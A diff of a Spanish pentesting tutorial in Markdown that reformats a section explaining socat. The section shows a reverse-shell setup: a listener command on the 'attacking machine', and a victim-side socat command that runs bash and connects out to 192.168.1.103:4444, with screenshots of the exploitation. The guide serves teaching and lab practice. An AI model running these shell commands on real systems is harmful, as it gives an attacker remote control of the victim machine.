@@ -164,22 +164,21 @@ A diferencia de netcat, que principalmente maneja conexiones TCP y UDP, socat pu
 
 Esta herramienta puede ser utilizada para una amplia gama de propósitos, desde tareas simples como transferir datos entre puertos hasta operaciones complejas como el establecimiento de túneles cifrados, la ejecución de comandos a través de sockets UNIX, o incluso la manipulación de tráfico a través de proxies. socat es excepcionalmente poderoso en situaciones que requieren la conversión entre diferentes tipos de interfaces o la manipulación detallada de opciones de socket.
 
+- En la máquina atancante: Primero necesitamos configurar socat para que escuche en un puerto específico y espere conexiones entrantes. Debemos asegurarte de que el puerto esté abierto y accesible desde la red en la que se encuentra el cliente objetivo.
+  ```
+  socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
+  ```
+  Este comando configura socat para escuchar en el puerto 4444. file:tty,raw,echo=0 configura socat para usar la terminal actual, desactivando el eco para que no veas duplicados los comandos que escribimos.
+  ![](capturas/shell-reversa-socat-mv-atacante.png)
 
-En la máquina atancante: Primero necesitamos configurar socat para que escuche en un puerto específico y espere conexiones entrantes. Debemos asegurarte de que el puerto esté abierto y accesible desde la red en la que se encuentra el cliente objetivo.
-```
-socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
-```
-Este comando configura socat para escuchar en el puerto 4444. file:tty,raw,echo=0 configura socat para usar la terminal actual, desactivando el eco para que no veas duplicados los comandos que escribimos.
-![](capturas/shell-reversa-socat-mv-atacante.png)
+- En la máquina víctima: Ejecutaremos otro comando socat para conectar con tu servidor y establecer la shell reversa. Necesitaremos la dirección IP de la máquina atacante.
+  ```
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.103:4444
+  ```
+  ![](capturas/shell-reversa-socat-mv-victima.png)
 
-En la máquina víctima: Ejecutaremos otro comando socat para conectar con tu servidor y establecer la shell reversa. Necesitaremos la dirección IP de la máquina atacante.
-```
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.103:4444
-```
-![](capturas/shell-reversa-socat-mv-victima.png)
-
-Comenzamos la explotación:
-![](capturas/shell-reversa-socat-mv-atacante-2.png)
+- Comenzamos la explotación:
+  ![](capturas/shell-reversa-socat-mv-atacante-2.png)
 
 
 #### Página dedicada a las shell reversas: PayloadsAllTheThings
